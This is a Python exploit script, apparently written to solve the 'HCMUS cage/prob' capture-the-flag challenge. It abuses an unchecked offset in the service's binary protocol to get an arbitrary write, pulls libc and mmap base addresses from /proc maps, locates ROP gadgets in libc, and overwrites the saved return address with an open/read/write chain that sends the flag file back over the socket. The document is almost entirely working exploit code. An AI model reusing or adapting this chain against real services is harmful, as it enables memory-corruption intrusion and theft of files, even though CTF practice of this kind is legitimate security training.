#!/usr/bin/env python3
import argparse, os, re, socket, struct, subprocess, sys, time


def p64(x: int) -> bytes:
    return struct.pack('<Q', x & 0xffffffffffffffff)


def p32be(x: int) -> bytes:
    return struct.pack('>I', x & 0xffffffff)


def pkt(op: int, payload: bytes = b'') -> bytes:
    h = bytearray(16)
    h[0] = 0x80
    h[1] = op
    h[8:12] = p32be(len(payload))
    return bytes(h) + payload


def recvn(s: socket.socket, n: int) -> bytes:
    out = bytearray()
    while len(out) < n:
        chunk = s.recv(n - len(out))
        if not chunk:
            break
        out += chunk
    return bytes(out)


def sendpkt(s: socket.socket, op: int, payload: bytes = b'') -> tuple[bytes, bytes]:
    s.sendall(pkt(op, payload))
    hdr = recvn(s, 16)
    if len(hdr) != 16:
        raise EOFError(f'short response header: {hdr!r}')
    ln = struct.unpack('>I', hdr[8:12])[0]
    body = recvn(s, ln)
    if len(body) != ln:
        raise EOFError(f'short response body: expected {ln}, got {len(body)}')
    return hdr, body


def set_offset(s: socket.socket, off: int) -> None:
    sendpkt(s, 2, p32be(off))


# op4: memcpy(state+0x20+off, payload, len) with only len<=0x20 checked
# off=0x20 overlaps state->buf at +0x40, then op3 writes to state->buf+off

def arb_write(s: socket.socket, addr: int, data: bytes) -> None:
    set_offset(s, 0x20)
    sendpkt(s, 4, p64(addr - 0x20))
    sendpkt(s, 3, data)


def read_text(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return f.read()
    except OSError:
        return ''


def proc_comm(pid: int) -> str:
    return read_text(f'/proc/{pid}/comm').strip()


def proc_cmdline(pid: int) -> str:
    try:
        raw = open(f'/proc/{pid}/cmdline', 'rb').read()
    except OSError:
        return ''
    return raw.replace(b'\0', b' ').decode(errors='replace').strip()


def proc_state(pid: int) -> str:
    stat = read_text(f'/proc/{pid}/stat')
    if not stat:
        return '?'
    try:
        return stat.rsplit(')', 1)[1].strip().split()[0]
    except Exception:
        return '?'


def find_listener_pid() -> int:
    cands = []
    for name in os.listdir('/proc'):
        if not name.isdigit():
            continue
        pid = int(name)
        if proc_comm(pid) != 'prob':
            continue
        if proc_state(pid) == 'Z':
            continue
        cmd = proc_cmdline(pid)
        if './prob' not in cmd and cmd != 'prob' and not cmd.endswith('/prob') and 'prob 5000' not in cmd:
            continue
        cands.append((pid, cmd))
    if not cands:
        raise SystemExit('[-] no live ./prob process found. Start it first with ./prob')
    cands.sort()
    pid, cmd = cands[0]
    print(f'[+] listener pid = {pid} ({cmd})', file=sys.stderr)
    return pid


def parse_maps(pid: int) -> tuple[int, int, int, str]:
    maps = open(f'/proc/{pid}/maps', 'r', encoding='utf-8').read().splitlines()
    entries = []
    for line in maps:
        parts = line.split()
        if len(parts) < 5:
            continue
        start_s, end_s = parts[0].split('-')
        start, end = int(start_s, 16), int(end_s, 16)
        perms = parts[1]
        offset = int(parts[2], 16)
        path = ' '.join(parts[5:]) if len(parts) >= 6 else ''
        entries.append({
            'start': start, 'end': end, 'size': end - start,
            'perms': perms, 'offset': offset, 'path': path, 'line': line,
        })

    libc = None
    stack_end = None
    for e in entries:
        if e['path'] == '[stack]':
            stack_end = e['end']
        if libc is None and 'libc.so' in e['path'] and e['offset'] == 0 and e['perms'].startswith('r'):
            libc = e
    if libc is None:
        # musl/alt naming fallback
        for e in entries:
            p = os.path.basename(e['path'])
            if 'libc' in p and '.so' in p and e['offset'] == 0 and e['perms'].startswith('r'):
                libc = e
                break
    if libc is None or stack_end is None:
        raise RuntimeError('failed to locate libc mapping or [stack] mapping in /proc maps')

    anon_rw = [
        e for e in entries
        if e['path'] == '' and e['perms'].startswith('rw-p') and e['size'] >= 0x100000
    ]
    if not anon_rw:
        anon_rw = [e for e in entries if e['path'] == '' and e['perms'].startswith('rw-p')]
    if not anon_rw:
        raise RuntimeError('failed to locate anonymous rw mapping for service mmap buffer')

    # main() mmaps 0x100000 bytes once before listening. On some kernels it merges
    # with nearby anon pages, so prefer the closest sizeable anon rw mapping below libc.
    below = [e for e in anon_rw if e['end'] <= libc['start']]
    if below:
        mmap_e = min(below, key=lambda e: (libc['start'] - e['end'], abs(e['size'] - 0x100000)))
    else:
        mmap_e = min(anon_rw, key=lambda e: (abs(e['size'] - 0x100000), abs(e['start'] - libc['start'])))

    return libc['start'], mmap_e['start'], stack_end, libc['path']




def resolve_path_for_pid(pid: int, path: str) -> str:
    if not path:
        return path
    if os.path.exists(path):
        return path
    proc_root = f'/proc/{pid}/root'
    alt = os.path.join(proc_root, path.lstrip('/'))
    if os.path.exists(alt):
        return alt
    # last resort: realpath through the process root if the parent exists
    parent = os.path.dirname(path)
    alt_parent = os.path.join(proc_root, parent.lstrip('/'))
    if os.path.isdir(alt_parent):
        alt2 = os.path.join(alt_parent, os.path.basename(path))
        if os.path.exists(alt2):
            return alt2
    return path


def readelf_loads(path: str):
    out = subprocess.check_output(['readelf', '-lW', path], text=True, stderr=subprocess.STDOUT)
    loads = []
    for line in out.splitlines():
        m = re.match(r'\s*LOAD\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)\s+([RWE ]+)\s+0x([0-9a-fA-F]+)', line)
        if m:
            off = int(m.group(1), 16)
            vaddr = int(m.group(2), 16)
            filesz = int(m.group(4), 16)
            flags = m.group(6).strip()
            loads.append((off, vaddr, filesz, flags))
    if not loads:
        raise RuntimeError(f'failed to parse LOAD segments from readelf -lW {path}')
    return loads


def find_gadget(path: str, pat: bytes, desc: str) -> int:
    loads = readelf_loads(path)
    with open(path, 'rb') as f:
        data = f.read()
    for off, vaddr, filesz, flags in loads:
        if 'E' not in flags:
            continue
        seg = data[off:off + filesz]
        idx = seg.find(pat)
        if idx != -1:
            return vaddr + idx
    raise RuntimeError(f'failed to find gadget {desc} in {path}')


def get_sym(path: str, name: str) -> int:
    # Prefer the dynamic symbol table; works on stripped libc as long as exported.
    out = subprocess.check_output(['readelf', '-sW', path], text=True, stderr=subprocess.STDOUT)
    pat = re.compile(r'\s+\d+:\s+([0-9a-fA-F]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\w+\s+' + re.escape(name) + r'(?:@@|@|$)')
    for line in out.splitlines():
        m = pat.match(line)
        if m:
            return int(m.group(1), 16)
    raise RuntimeError(f'missing symbol {name} in {path}')


def main() -> None:
    ap = argparse.ArgumentParser(description='Portable exploit for the HCMUS cage/prob challenge')
    ap.add_argument('host', nargs='?', default='127.0.0.1')
    ap.add_argument('port', nargs='?', type=int, default=5000)
    ap.add_argument('--pid', type=int)
    ap.add_argument('--libc', help='override loaded libc path')
    ap.add_argument('--libc-base', type=lambda x: int(x, 0))
    ap.add_argument('--mmap-base', type=lambda x: int(x, 0))
    ap.add_argument('--saved-rip', type=lambda x: int(x, 0))
    args = ap.parse_args()

    libc_base = args.libc_base
    mmap_base = args.mmap_base
    saved_rip = args.saved_rip
    libc_path = args.libc
    pid = args.pid

    if libc_base is None or mmap_base is None or saved_rip is None or libc_path is None:
        pid = pid if pid is not None else find_listener_pid()
        libc_base2, mmap_base2, stack_end, libc_path2 = parse_maps(pid)
        if libc_base is None:
            libc_base = libc_base2
        if mmap_base is None:
            mmap_base = mmap_base2
        if saved_rip is None:
            saved_rip = stack_end - 0x2f48
        if libc_path is None:
            libc_path = libc_path2

    if pid is not None:
        libc_path = resolve_path_for_pid(pid, libc_path)

    print(f'[+] libc_base = {libc_base:#x}', file=sys.stderr)
    print(f'[+] mmap_base = {mmap_base:#x}', file=sys.stderr)
    print(f'[+] saved_rip = {saved_rip:#x}', file=sys.stderr)
    print(f'[+] libc_path = {libc_path}', file=sys.stderr)

    pop_rdi = libc_base + find_gadget(libc_path, b'\x5f\xc3', 'pop rdi; ret')
    pop_rsi = libc_base + find_gadget(libc_path, b'\x5e\xc3', 'pop rsi; ret')
    try:
        pop_rdx = libc_base + find_gadget(libc_path, b'\x5a\xc3', 'pop rdx; ret')
        rdx_pad = 0
        def set_rdx(v: int) -> list[int]:
            return [pop_rdx, v]
    except RuntimeError:
        pop_rdx_rbx = libc_base + find_gadget(libc_path, b'\x5a\x5b\xc3', 'pop rdx; pop rbx; ret')
        def set_rdx(v: int) -> list[int]:
            return [pop_rdx_rbx, v, 0]
    ret = libc_base + find_gadget(libc_path, b'\xc3', 'ret')

    open_ = libc_base + get_sym(libc_path, 'open')
    read_ = libc_base + get_sym(libc_path, 'read')
    write_ = libc_base + get_sym(libc_path, 'write')
    exit_ = libc_base + get_sym(libc_path, 'exit')

    filename_addr = mmap_base + 0x100
    io_buf = mmap_base + 0x300

    s = socket.create_connection((args.host, args.port), timeout=3)

    set_offset(s, 0x100)
    sendpkt(s, 3, b'flag\x00')

    chain = [
        ret,
        pop_rdi, filename_addr,
        pop_rsi, 0,
        open_,
        pop_rdi, 3,
        pop_rsi, io_buf,
        *set_rdx(0x100),
        read_,
        pop_rdi, 4,
        pop_rsi, io_buf,
        *set_rdx(0x100),
        write_,
        pop_rdi, 0,
        exit_,
    ]
    rop = b''.join(p64(x) for x in chain)
    arb_write(s, saved_rip, rop)
    time.sleep(0.1)
    out = s.recv(4096)
    print(out.split(b'\x00')[0].decode(errors='replace'))


if __name__ == '__main__':
    main()
